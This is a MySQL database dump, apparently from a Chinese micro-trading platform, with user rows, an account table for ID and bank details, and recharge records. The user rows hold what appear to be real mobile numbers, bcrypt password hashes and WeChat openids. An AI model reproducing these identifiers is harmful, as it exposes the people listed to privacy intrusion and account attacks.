INSERT INTO `user` VALUES ('100002', '13915000000', '$2y$13$nkFmIHo9WjjT7Dl1n0R8qeG8qTrIwOEAcJtGHFGjRlGSkQ4VZ/vpC', '13915000000', '阿琦', '0', '0', '', '0.00', '10.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/Q3auHgzwzM7RyWtDNYoEpfYH4kRS6Z8rLWIBib2XReC8qc6BSXicpDJPYUM9dJPlj5dKTdiaS1zgScnPmIWV9BfDPfKQAuRpYXaXQJsOHFn7fI/0', 'oAkX8wJx-E6cl2y_8zqcs9ElSK30', '1', '1', '2017-05-17 16:54:19', '0', '2017-08-25 16:54:53', '1');
INSERT INTO `user` VALUES ('100003', '15851408673', '$2y$13$TSE44yDqGmBjgCkPhHhez.VzPNmKusn/HiWBTRhHKE5/Z2PAb75YW', '15851408673', 'A   卡卡', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/TTQibyKjrickxrFbQBjGNpCIHubLzNe2phdQibM8K9MlSItX1MvNaeBOQlFPgTfgekHaA8r4RjzBricic7kjk7Sl3g3Xsic84b77VF/0', 'oAkX8wH2riqqCsO5nHrxD7qGHcyg', '1', '1', '2017-05-17 17:01:05', '0', '2017-05-17 18:13:25', '100003');
INSERT INTO `user` VALUES ('100004', '0', '0', '0', '啊生', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/Q3auHgzwzM4w3VfQWuoVpxCiafCicT7icLPd8EZtaXgHwGn8iaTPIxzicj8gOVn7gTBjv8H2ZAeicVhR6eQzxZ1sxsdSia5ic4thzibTjbEd0MrjF6U8/0', 'oAkX8wGy-VsJfcGN4LmXizDY5KVE', '1', '1', '2017-05-17 17:35:49', '0', '2017-05-17 17:35:49', '0');
INSERT INTO `user` VALUES ('100005', '15055620906', '$2y$13$SWknW09xZI02w7VbcbzM..Gw2YoxQ6hm/C4G7u6PkVl3A6Deb7VW2', '15055620906', '那个谁谁', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/8X3XM1icYAL1qnvmZYqBhaDqvZicgqY0pVSIGkKoJXTPYoU6l3H5ZhaPbxWdsNKfqibLbNoDhdibQSxg4yf5eibAdW67DuYaTLGibe/0', 'oAkX8wFCQ-l6qUDIsp4kctiry5sQ', '1', '1', '2017-05-17 17:38:00', '0', '2017-05-17 17:38:45', '100005');
INSERT INTO `user` VALUES ('100006', '13926365156', '$2y$13$iTz2X24ocy0LbKaFC7L7Qeah2/fYPtcsJdNKaRvsPCCzPqN.jWkUG', '13926365156', '微交易平台开发、搭建', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/Q3auHgzwzM4p4D5C1zLW98OQeFJMIhSZhajH3KBmLBLEYaFx8rH8icYCxsiaEfCwKHcupRGFn2Tl9AZIEl3nHicH4PJRpp0zRver8tmCItcaZI/0', 'oAkX8wA0DBTWNTNCit6o6G0kWNw8', '1', '1', '2017-05-17 17:43:47', '0', '2017-05-17 17:45:44', '100006');
INSERT INTO `user` VALUES ('100007', '18917587723', '$2y$13$m4SAqfAOAxtIPYDgHjCO0ernduvuoKZM3sMPTURYzU3kCxQSz0Ohi', '18917587723', '陈生', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/lmahJWgvUqKvYgDp2APEtuUT3SnklQkkEvAXCpKUmYTJUG1c9z7fvwZMwmws6pvXHOk6eriaVuCtCUmrLwvFGFALfs4c8VTxc/0', 'oAkX8wBdzb8qPlXLnizbInzqKb8k', '1', '1', '2017-05-17 17:45:43', '0', '2017-05-17 17:46:28', '100007');
INSERT INTO `user` VALUES ('100008', '0', '0', '0', '习惯。', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/lmahJWgvUqKvYgDp2APEtjHy7LFOo3RtnlmkGp2lDd8dk6IcYzdL6ZmQicicgEw49hKsLLfCYweiaDBAqUKeyMibTBV7cdtZWLTI/0', 'oAkX8wGwZLMpzSSXpfH2PGQDZCx8', '1', '1', '2017-05-17 18:00:30', '0', '2017-05-17 18:00:30', '0');
INSERT INTO `user` VALUES ('100009', '13926365156', '$2y$13$QZJ8sbZnE558mJs7g2CQD.6DxRpKAGB6p54nh4VN5KMl5MNus5cIG', '13926365156', '', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/FG6p1MaDC9dxcJAUetffBmniaeOJSYNwMBJVBA6bWqbtiaduvAAWN7l4N0M9QDo3uApaaI9PkQH3h1YGS3ibXejC34nAs9QFDPp/0', 'oAkX8wEeiDm83-FZh2b7qTjQpKro', '1', '1', '2017-05-17 18:29:19', '0', '2017-05-17 18:30:06', '100009');
INSERT INTO `user` VALUES ('100010', '18714833722', '$2y$13$GJQ1VFk6RW/0pL7sXhztD.fYRUDhrme7HNBPRBelE2uJfGE4ESKgy', '18714833722', '梦想', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/ajNVdqHZLLDARq5J3iaRoBF0nWEcY1icRibwwzl86AISDUvuSEEaRyZ1wpD203cwKwCQic4iaK8uFC2sUU4HH38J8Lw/0', 'oAkX8wKcfsuvgImOkatqYhz-aYdg', '1', '1', '2017-05-18 20:51:48', '0', '2017-05-18 21:49:13', '100010');
INSERT INTO `user` VALUES ('100011', '15994223413', '$2y$13$cHDbX2.ELhz3w37LVYwSQevFcMcIKjosqT00Cgs98k/7qkXHsvqA.', '15994223413', 'John白', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/TTQibyKjrickxrFbQBjGNpCLRl42Bb4Tqtwc6icYWNcvXYGWYLpdFUCJ2A1hzkibQ2rMs1qtjRSms2Nfqaht7yiarFoDBaWLc4icn6/0', 'oAkX8wC4oCWaZm_eOkQOB6ZkeLYs', '1', '1', '2017-05-18 22:42:50', '0', '2017-05-18 22:43:48', '100011');
INSERT INTO `user` VALUES ('100012', '15327151678', '$2y$13$O4ksglhs61bidQEN.R7gfeG5OGNtuaYG4VZ42Eqhb008zWQ1SGyHm', '15327151678', '热情', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/AKngJcckcSVB7tz0NQ39jWjICMqfDTmsh5cT9jt1DtbjAg7qq5DGLGZUXYhzico7yqLPgwzrbZJqJ5moXR9B5xw/0', 'oAkX8wBoETu4ZEMIuSSaUD55iDA8', '1', '1', '2017-05-18 22:42:56', '0', '2017-05-18 22:44:09', '100012');
INSERT INTO `user` VALUES ('100013', '13636263452', '$2y$13$J/bb5L03RgDgK0R1ok1WruCL73GCKNTS2Ya21VGloBlOGcFcO7XRu', '13636263452', 'Svan-斯梵', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/8X3XM1icYAL1qnvmZYqBhaI3XTiagf1FlQEXIdAfLCd5vJGpTUr5p3ic9SmMVecXEwNzTNK4058ibBZluPn0cXMNuHHedbEra4xk/0', 'oAkX8wISVN4nrvo5A18DW9WKuxoU', '1', '1', '2017-05-18 22:43:19', '0', '2017-05-18 22:44:26', '100013');
INSERT INTO `user` VALUES ('100014', '13871207155', '$2y$13$MNv0v5FzCQAadoPzslT2/e4TA/jTIENYVD.aLYLg14NxjnDq21/ZW', '13871207155', '风淡云轻', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/Q3auHgzwzM6oxtXIB2uzAAbSHYXluXV9e0OsZNOo9EtcpYpoDgpwJE1Vsn1iaUfL8SQBxhBKO9EeFm3lFEicrtFw/0', 'oAkX8wO6pEk5FZrKnbwcrwNSmvBc', '1', '1', '2017-05-18 22:50:52', '0', '2017-05-18 22:53:03', '100014');
INSERT INTO `user` VALUES ('100015', '0', '0', '0', '甜甜', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/PiajxSqBRaEInZ7P0spCAxFQicNWfspUQGVnVfeJpFmael8elqgHZuUq92EicyFDictGyibD9G7iazPMcI9YKicuGzZRg/0', 'oAkX8wOSWMh0x3JPhOvKpnfooab0', '1', '1', '2017-05-18 22:50:59', '0', '2017-05-18 22:50:59', '0');
INSERT INTO `user` VALUES ('100016', '13297051035', '$2y$13$bqqVtCH7jzp.xAGv5vh7Qezb.88Ziuqz2pd.mwvUHqYM.2b44m32W', '13297051035', '他说的秘密', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/AKngJcckcSWSMa47FxnO9LJwCkBKs5CwnwZLsIr6vDO4NS9TkT9RiaWDvN2rp3w7AlIQOr2aVU1LWsjOficvE8Yq831ACPA7v4/0', 'oAkX8wIbXM10P0qRdc37Ou2mRLAA', '1', '1', '2017-05-18 22:51:34', '0', '2017-05-18 22:52:25', '100016');
INSERT INTO `user` VALUES ('100017', '15707282603', '$2y$13$2ZFFCAmb9426BGBFfqaYZ.MT/R5muVZgnlX.mvis7mcFP0Q/DEWYC', '15707282603', '我就是小强', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/TTQibyKjrickyKMNqLIsp3M9xiabDwNIjwd8wzl5MyWQoyXGo4ibPxen7KbGM9roexT1AqWYgCiaG8fOdcaqYicYrebGZA4O1UQjdg/0', 'oAkX8wKt9hO8SjicOBgjTI36x_U0', '1', '1', '2017-05-18 22:52:02', '0', '2017-05-18 22:53:04', '100017');
INSERT INTO `user` VALUES ('100018', '13871517509', '$2y$13$ysa70S9a1LLxSXdcqdSQ..MQ5POrwzNYH/2XsIkEAnb6hIPiEjQzO', '13871517509', 'Bruce', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/lmahJWgvUqKvYgDp2APEtqgy3Sgzshk4EwQpNzxSS3NugGicWkAypGDOiboyJKaU55icvKD8BE6NyOfibJVjqhSXJJbZtpKe6rdB/0', 'oAkX8wGnUMQHIIBB5yocMMFqjJR8', '1', '1', '2017-05-18 22:52:27', '0', '2017-05-18 22:53:45', '100018');
INSERT INTO `user` VALUES ('100019', '13451259990', '$2y$13$hHoFwxUEALbnVJ4ilFF/H.91DCAqwrv72B4l06syHbh/YqJtfFTwW', '13451259990', '飘逸', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/TTQibyKjrickzuLMKEv1RjGor3uF8mr3KE2hps9n96hhr57pcricaFMtCSqU90B79QsKMiaXS8XLryg5NpAKgdSVxaiawV36R5o28/0', 'oAkX8wI7EiwsxAu1gumveVxXOuEE', '1', '1', '2017-05-18 22:54:44', '0', '2017-05-18 22:55:47', '100019');
INSERT INTO `user` VALUES ('100020', '0', '0', '0', 'Mr·Trying', '0', '0', '', '0.00', '0.00', '0.00', '0.00', '0.00', '0.00', '', null, '-1', 'http://wx.qlogo.cn/mmopen/TTQibyKjrickxrCwT60ff0bDpurSMxXskXB9hBoVz6X4P6Yicn7jsE0Z1rzJfvGAXU9dhiazejhMprT4D3jB67wcQzmOoiaJQNvfv/0', 'oAkX8wHE5upUS2y4o_TWrIydxKuY', '1', '1', '2017-05-18 23:08:10', '0', '2017-05-18 23:08:10', '0');

-- ----------------------------
-- Table structure for user_account
-- ----------------------------
DROP TABLE IF EXISTS `user_account`;
CREATE TABLE `user_account` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '用户ID',
  `realname` varchar(100) NOT NULL COMMENT '真实姓名',
  `id_card` varchar(100) NOT NULL COMMENT '身份证号',
  `bank_name` varchar(100) NOT NULL COMMENT '银行名称',
  `bank_card` varchar(100) NOT NULL COMMENT '银行卡号',
  `bank_user` varchar(100) NOT NULL COMMENT '持卡人姓名',
  `bank_mobile` char(11) NOT NULL COMMENT '银行预留手机号',
  `bank_address` varchar(100) DEFAULT NULL COMMENT '开户行地址',
  `address` varchar(150) DEFAULT NULL COMMENT '地址',
  `created_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='用户账户表';

-- ----------------------------
-- Records of user_account
-- ----------------------------
INSERT INTO `user_account` VALUES ('1', '100001', '123456', '352411', '农业银行', '35245121', '小张', '12354625', '测试时', '', '2017-06-22 18:03:32');

-- ----------------------------
-- Table structure for user_charge
-- ----------------------------
DROP TABLE IF EXISTS `user_charge`;
CREATE TABLE `user_charge` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '用户ID',
  `trade_no` varchar(250) NOT NULL DEFAULT '' COMMENT '订单编号',
  `amount` decimal(11,2) NOT NULL COMMENT '充值金额',
  `charge_type` tinyint(4) DEFAULT '1' COMMENT '充值方式：1支付宝，2微信',
  `charge_state` tinyint(4) DEFAULT NULL COMMENT '充值状态：1待付款，2成功，-1失败',
  `created_at` datetime DEFAULT NULL COMMENT '充值时间',
  `updated_at` datetime DEFAULT NULL COMMENT '审核时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=146 DEFAULT CHARSET=utf8 COMMENT='充值记录表';

-- ----------------------------
-- Records of user_charge
-- ----------------------------
INSERT INTO `user_charge` VALUES ('1', '100001', '100001201708191036274755', '0.01', '6', '2', '2017-08-19 10:36:27', '2017-08-19 10:36:27');
INSERT INTO `user_charge` VALUES ('2', '100001', '100001201708231427124903', '0.01', '6', '2', '2017-08-23 14:27:12', '2017-08-23 14:27:12');
INSERT INTO `user_charge` VALUES ('3', '100001', '100001201708231456289718', '0.01', '6', '2', '2017-08-23 14:56:28', '2017-08-23 14:56:28');
INSERT INTO `user_charge` VALUES ('4', '100001', '100001201708231500309238', '0.01', '6', '2', '2017-08-23 15:00:30', '2017-08-23 15:00:30');
INSERT INTO `user_charge` VALUES ('5', '100001', '100001201708231500412257', '0.01', '6', '2', '2017-08-23 15:00:41', '2017-08-23 15:00:41');
INSERT INTO `user_charge` VALUES ('6', '100001', '100001201708231500566854', '4800.00', '6', '2', '2017-08-23 15:00:56', '2017-08-23 15:00:56');
INSERT INTO `user_charge` VALUES ('7', '100001', '100001201708231501049452', '4800.00', '6', '2', '2017-08-23 15:01:04', '2017-08-23 15:01:04');
INSERT INTO `user_charge` VALUES ('8', '100001', '100001201708231501244145', '4800.00', '6', '2', '2017-08-23 15:01:24', '2017-08-23 15:01:24');
INSERT INTO `user_charge` VALUES ('9', '100001', '100001201708231505083343', '4800.00', '6', '2', '2017-08-23 15:05:08', '2017-08-23 15:05:08');
INSERT INTO `user_charge` VALUES ('10', '100001', '100001201708251424427322', '4800.00', '2', '1', '2017-08-25 14:24:42', '2017-08-25 14:24:42');
INSERT INTO `user_charge` VALUES ('11', '100001', '100001201708251543331272', '4800.00', '6', '1', '2017-08-25 15:43:33', '2017-08-25 15:43:33');
INSERT INTO `user_charge` VALUES ('15', '100001', '100001201708181506369561', '4800.00', '1', '1', '2017-08-18 15:06:36', '2017-08-18 15:06:36');
INSERT INTO `user_charge` VALUES ('16', '100001', '100001201708241118254812', '0.01', '1', '1', '2017-08-24 11:18:25', '2017-08-24 11:18:25');
INSERT INTO `user_charge` VALUES ('17', '100001', '100001201708241145433965', '0.01', '1', '1', '2017-08-24 11:45:43', '2017-08-24 11:45:43');
INSERT INTO `user_charge` VALUES ('18', '100001', '100001201708241145532081', '0.01', '1', '1', '2017-08-24 11:45:53', '2017-08-24 11:45:53');
INSERT INTO `user_charge` VALUES ('19', '100001', '100001201708241146146133', '0.01', '1', '1', '2017-08-24 11:46:14', '2017-08-24 11:46:14');
INSERT INTO `user_charge` VALUES ('20', '100001', '100001201708241146579013', '0.01', '1', '1', '2017-08-24 11:46:57', '2017-08-24 11:46:57');
INSERT INTO `user_charge` VALUES ('21', '100001', '100001201708241147138350', '0.01', '1', '1', '2017-08-24 11:47:13', '2017-08-24 11:47:13');
INSERT INTO `user_charge` VALUES ('22', '100001', '100001201708241148315027', '0.01', '1', '1', '2017-08-24 11:48:31', '2017-08-24 11:48:31');
INSERT INTO `user_charge` VALUES ('23', '100001', '100001201708241149406075', '0.01', '1', '1', '2017-08-24 11:49:40', '2017-08-24 11:49:40');
INSERT INTO `user_charge` VALUES ('24', '100001', '100001201708241150217218', '0.01', '4', '1', '2017-08-24 11:50:21', '2017-08-24 11:50:21');
INSERT INTO `user_charge` VALUES ('25', '100001', '100001201708241150242459', '0.01', '1', '1', '2017-08-24 11:50:24', '2017-08-24 11:50:24');
INSERT INTO `user_charge` VALUES ('26', '100001', '100001201708241151568962', '0.01', '1', '1', '2017-08-24 11:51:56', '2017-08-24 11:51:56');
INSERT INTO `user_charge` VALUES ('27', '100001', '100001201708241152528345', '0.01', '4', '1', '2017-08-24 11:52:52', '2017-08-24 11:52:52');
INSERT INTO `user_charge` VALUES ('28', '100001', '100001201708241152551684', '0.01', '4', '1', '2017-08-24 11:52:55', '2017-08-24 11:52:55');
INSERT INTO `user_charge` VALUES ('29', '100001', '100001201708241152595086', '0.01', '4', '1', '2017-08-24 11:52:59', '2017-08-24 11:52:59');
INSERT INTO `user_charge` VALUES ('30', '100001', '100001201708241153027849', '0.01', '1', '1', '2017-08-24 11:53:02', '2017-08-24 11:53:02');
INSERT INTO `user_charge` VALUES ('31', '100001', '100001201708241155482350', '0.01', '1', '1', '2017-08-24 11:55:48', '2017-08-24 11:55:48');
INSERT INTO `user_charge` VALUES ('32', '100001', '100001201708241155511266', '0.01', '1', '1', '2017-08-24 11:55:51', '2017-08-24 11:55:51');
INSERT INTO `user_charge` VALUES ('33', '100001', '100001201708241155567274', '0.01', '1', '1', '2017-08-24 11:55:56', '2017-08-24 11:55:56');
INSERT INTO `user_charge` VALUES ('34', '100001', '100001201708241156003836', '0.01', '1', '1', '2017-08-24 11:56:00', '2017-08-24 11:56:00');
INSERT INTO `user_charge` VALUES ('35', '100001', '100001201708241156306851', '0.01', '4', '1', '2017-08-24 11:56:30', '2017-08-24 11:56:30');
INSERT INTO `user_charge` VALUES ('36', '100001', '100001201708241157086337', '0.01', '4', '1', '2017-08-24 11:57:08', '2017-08-24 11:57:08');
INSERT INTO `user_charge` VALUES ('37', '100001', '100001201708241157123058', '0.01', '1', '1', '2017-08-24 11:57:12', '2017-08-24 11:57:12');
INSERT INTO `user_charge` VALUES ('38', '100001', '100001201708241158002678', '0.01', '4', '1', '2017-08-24 11:58:00', '2017-08-24 11:58:00');
INSERT INTO `user_charge` VALUES ('39', '100001', '100001201708241158028384', '0.01', '4', '1', '2017-08-24 11:58:02', '2017-08-24 11:58:02');
INSERT INTO `user_charge` VALUES ('40', '100001', '100001201708241159085203', '0.01', '4', '1', '2017-08-24 11:59:08', '2017-08-24 11:59:08');
INSERT INTO `user_charge` VALUES ('41', '100001', '100001201708241159125918', '0.01', '4', '1', '2017-08-24 11:59:12', '2017-08-24 11:59:12');
INSERT INTO `user_charge` VALUES ('42', '100001', '100001201708241200536703', '0.01', '4', '1', '2017-08-24 12:00:53', '2017-08-24 12:00:53');
INSERT INTO `user_charge` VALUES ('43', '100001', '100001201708241201102094', '0.01', '4', '1', '2017-08-24 12:01:10', '2017-08-24 12:01:10');
INSERT INTO `user_charge` VALUES ('44', '100001', '100001201708241201196441', '0.01', '4', '1', '2017-08-24 12:01:19', '2017-08-24 12:01:19');
INSERT INTO `user_charge` VALUES ('45', '100001', '100001201708241319444758', '0.01', '4', '1', '2017-08-24 13:19:44', '2017-08-24 13:19:44');
INSERT INTO `user_charge` VALUES ('46', '100001', '100001201708241319456246', '0.01', '4', '1', '2017-08-24 13:19:45', '2017-08-24 13:19:45');
INSERT INTO `user_charge` VALUES ('47', '100001', '100001201708241319456278', '0.01', '4', '1', '2017-08-24 13:19:45', '2017-08-24 13:19:45');
INSERT INTO `user_charge` VALUES ('48', '100001', '100001201708241319463452', '0.01', '4', '1', '2017-08-24 13:19:46', '2017-08-24 13:19:46');
INSERT INTO `user_charge` VALUES ('49', '100001', '100001201708241319464717', '0.01', '4', '1', '2017-08-24 13:19:46', '2017-08-24 13:19:46');
INSERT INTO `user_charge` VALUES ('50', '100001', '100001201708241319479127', '0.01', '4', '1', '2017-08-24 13:19:47', '2017-08-24 13:19:47');
INSERT INTO `user_charge` VALUES ('51', '100001', '100001201708241321421447', '0.01', '4', '1', '2017-08-24 13:21:42', '2017-08-24 13:21:42');
INSERT INTO `user_charge` VALUES ('52', '100001', '100001201708241322227419', '0.01', '1', '1', '2017-08-24 13:22:22', '2017-08-24 13:22:22');
INSERT INTO `user_charge` VALUES ('53', '100001', '100001201708241333371856', '0.01', '1', '1', '2017-08-24 13:33:37', '2017-08-24 13:33:37');
INSERT INTO `user_charge` VALUES ('54', '100001', '100001201708241334597141', '0.01', '1', '1', '2017-08-24 13:34:59', '2017-08-24 13:34:59');
INSERT INTO `user_charge` VALUES ('55', '100001', '100001201708241337416768', '0.01', '1', '1', '2017-08-24 13:37:41', '2017-08-24 13:37:41');
INSERT INTO `user_charge` VALUES ('56', '100001', '100001201708241338087102', '0.01', '1', '1', '2017-08-24 13:38:08', '2017-08-24 13:38:08');
INSERT INTO `user_charge` VALUES ('57', '100001', '100001201708241435027941', '0.01', '1', '1', '2017-08-24 14:35:02', '2017-08-24 14:35:02');
INSERT INTO `user_charge` VALUES ('58', '100001', '100001201708241435056151', '0.01', '4', '1', '2017-08-24 14:35:05', '2017-08-24 14:35:05');
INSERT INTO `user_charge` VALUES ('59', '100001', '100001201708241441541802', '0.01', '4', '1', '2017-08-24 14:41:54', '2017-08-24 14:41:54');
INSERT INTO `user_charge` VALUES ('60', '100001', '100001201708241442151096', '0.01', '4', '1', '2017-08-24 14:42:15', '2017-08-24 14:42:15');
INSERT INTO `user_charge` VALUES ('61', '100001', '100001201708241443327843', '0.01', '4', '1', '2017-08-24 14:43:32', '2017-08-24 14:43:32');
INSERT INTO `user_charge` VALUES ('62', '100001', '100001201708241443507035', '0.01', '4', '1', '2017-08-24 14:43:50', '2017-08-24 14:43:50');
INSERT INTO `user_charge` VALUES ('63', '100001', '100001201708241444415413', '0.01', '4', '1', '2017-08-24 14:44:41', '2017-08-24 14:44:41');
INSERT INTO `user_charge` VALUES ('64', '100001', '100001201708241449573367', '0.01', '4', '1', '2017-08-24 14:49:57', '2017-08-24 14:49:57');
INSERT INTO `user_charge` VALUES ('65', '100001', '100001201708241450308433', '0.01', '4', '1', '2017-08-24 14:50:30', '2017-08-24 14:50:30');
INSERT INTO `user_charge` VALUES ('66', '100001', '100001201708241451042337', '0.01', '1', '1', '2017-08-24 14:51:04', '2017-08-24 14:51:04');
INSERT INTO `user_charge` VALUES ('67', '100001', '100001201708241451092643', '0.01', '4', '1', '2017-08-24 14:51:09', '2017-08-24 14:51:09');
INSERT INTO `user_charge` VALUES ('68', '100001', '100001201708241451145588', '0.01', '1', '1', '2017-08-24 14:51:14', '2017-08-24 14:51:14');
INSERT INTO `user_charge` VALUES ('69', '100001', '100001201708241451419327', '0.01', '1', '1', '2017-08-24 14:51:41', '2017-08-24 14:51:41');
INSERT INTO `user_charge` VALUES ('70', '100001', '100001201708241454554315', '0.01', '1', '1', '2017-08-24 14:54:55', '2017-08-24 14:54:55');
INSERT INTO `user_charge` VALUES ('71', '100001', '100001201708241500199174', '0.01', '1', '1', '2017-08-24 15:00:19', '2017-08-24 15:00:19');
INSERT INTO `user_charge` VALUES ('72', '100001', '100001201708241500239852', '0.01', '1', '1', '2017-08-24 15:00:23', '2017-08-24 15:00:23');
INSERT INTO `user_charge` VALUES ('73', '100001', '100001201708241500296977', '0.01', '1', '1', '2017-08-24 15:00:29', '2017-08-24 15:00:29');
INSERT INTO `user_charge` VALUES ('74', '100001', '100001201708241500397690', '0.01', '1', '1', '2017-08-24 15:00:39', '2017-08-24 15:00:39');
INSERT INTO `user_charge` VALUES ('75', '100001', '100001201708241500592534', '0.01', '1', '1', '2017-08-24 15:00:59', '2017-08-24 15:00:59');
INSERT INTO `user_charge` VALUES ('76', '100001', '100001201708241501437552', '0.01', '4', '1', '2017-08-24 15:01:43', '2017-08-24 15:01:43');
INSERT INTO `user_charge` VALUES ('77', '100001', '100001201708241501548820', '0.01', '4', '1', '2017-08-24 15:01:54', '2017-08-24 15:01:54');
INSERT INTO `user_charge` VALUES ('78', '100001', '100001201708241502001090', '0.01', '1', '1', '2017-08-24 15:02:00', '2017-08-24 15:02:00');
INSERT INTO `user_charge` VALUES ('79', '100001', '100001201708241504316940', '0.01', '1', '1', '2017-08-24 15:04:31', '2017-08-24 15:04:31');
INSERT INTO `user_charge` VALUES ('80', '100001', '100001201708241717371585', '0.01', '1', '1', '2017-08-24 17:17:37', '2017-08-24 17:17:37');
INSERT INTO `user_charge` VALUES ('81', '100001', '100001201708241717429045', '0.01', '4', '1', '2017-08-24 17:17:42', '2017-08-24 17:17:42');
INSERT INTO `user_charge` VALUES ('82', '100001', '100001201708241729518650', '0.01', '1', '1', '2017-08-24 17:29:51', '2017-08-24 17:29:51');
INSERT INTO `user_charge` VALUES ('83', '100001', '100001201708241730099543', '0.01', '1', '1', '2017-08-24 17:30:09', '2017-08-24 17:30:09');
INSERT INTO `user_charge` VALUES ('84', '100001', '100001201708241731301602', '0.01', '1', '1', '2017-08-24 17:31:30', '2017-08-24 17:31:30');
INSERT INTO `user_charge` VALUES ('85', '100001', '100001201708241731563307', '0.01', '1', '1', '2017-08-24 17:31:56', '2017-08-24 17:31:56');
INSERT INTO `user_charge` VALUES ('86', '100001', '100001201708241732056448', '0.01', '1', '1', '2017-08-24 17:32:05', '2017-08-24 17:32:05');
INSERT INTO `user_charge` VALUES ('87', '100001', '100001201708241732126889', '0.01', '1', '1', '2017-08-24 17:32:12', '2017-08-24 17:32:12');
INSERT INTO `user_charge` VALUES ('88', '100001', '100001201708241732208039', '0.01', '1', '1', '2017-08-24 17:32:20', '2017-08-24 17:32:20');
INSERT INTO `user_charge` VALUES ('89', '100001', '100001201708241734025183', '0.01', '4', '1', '2017-08-24 17:34:02', '2017-08-24 17:34:02');
INSERT INTO `user_charge` VALUES ('90', '100001', '100001201708241737074014', '0.01', '1', '1', '2017-08-24 17:37:07', '2017-08-24 17:37:07');
INSERT INTO `user_charge` VALUES ('91', '100001', '100001201708241739354335', '0.01', '1', '1', '2017-08-24 17:39:35', '2017-08-24 17:39:35');
INSERT INTO `user_charge` VALUES ('92', '100001', '100001201708241740061160', '0.01', '1', '1', '2017-08-24 17:40:06', '2017-08-24 17:40:06');
INSERT INTO `user_charge` VALUES ('93', '100001', '100001201708241746376234', '0.01', '1', '1', '2017-08-24 17:46:37', '2017-08-24 17:46:37');
INSERT INTO `user_charge` VALUES ('94', '100001', '100001201708241746436910', '0.01', '1', '1', '2017-08-24 17:46:43', '2017-08-24 17:46:43');
INSERT INTO `user_charge` VALUES ('95', '100001', '100001201708241747193629', '0.01', '1', '1', '2017-08-24 17:47:19', '2017-08-24 17:47:19');
INSERT INTO `user_charge` VALUES ('96', '100001', '100001201708250938023803', '0.01', '1', '1', '2017-08-25 09:38:02', '2017-08-25 09:38:02');
INSERT INTO `user_charge` VALUES ('97', '100001', '100001201708250938045062', '0.01', '1', '1', '2017-08-25 09:38:04', '2017-08-25 09:38:04');
INSERT INTO `user_charge` VALUES ('98', '100001', '100001201708250938219126', '0.01', '1', '1', '2017-08-25 09:38:21', '2017-08-25 09:38:21');
INSERT INTO `user_charge` VALUES ('99', '100001', '100001201708250957509187', '0.01', '1', '1', '2017-08-25 09:57:50', '2017-08-25 09:57:50');
INSERT INTO `user_charge` VALUES ('100', '100001', '100001201708250958136567', '0.01', '1', '1', '2017-08-25 09:58:13', '2017-08-25 09:58:13');
INSERT INTO `user_charge` VALUES ('101', '100001', '100001201708250959379776', '0.01', '1', '1', '2017-08-25 09:59:37', '2017-08-25 09:59:37');
INSERT INTO `user_charge` VALUES ('102', '100001', '100001201708250959566782', '0.01', '1', '1', '2017-08-25 09:59:56', '2017-08-25 09:59:56');
INSERT INTO `user_charge` VALUES ('103', '100001', '100001201708251000234273', '0.01', '1', '1', '2017-08-25 10:00:23', '2017-08-25 10:00:23');
INSERT INTO `user_charge` VALUES ('104', '100001', '100001201708251000441324', '0.01', '1', '1', '2017-08-25 10:00:44', '2017-08-25 10:00:44');
INSERT INTO `user_charge` VALUES ('105', '100001', '100001201708251000522822', '0.01', '1', '1', '2017-08-25 10:00:52', '2017-08-25 10:00:52');
INSERT INTO `user_charge` VALUES ('106', '100001', '100001201708251001363370', '0.01', '1', '1', '2017-08-25 10:01:36', '2017-08-25 10:01:36');
INSERT INTO `user_charge` VALUES ('107', '100001', '100001201708251001384395', '0.01', '1', '1', '2017-08-25 10:01:38', '2017-08-25 10:01:38');
INSERT INTO `user_charge` VALUES ('108', '100001', '100001201708251001479893', '0.01', '1', '1', '2017-08-25 10:01:47', '2017-08-25 10:01:47');
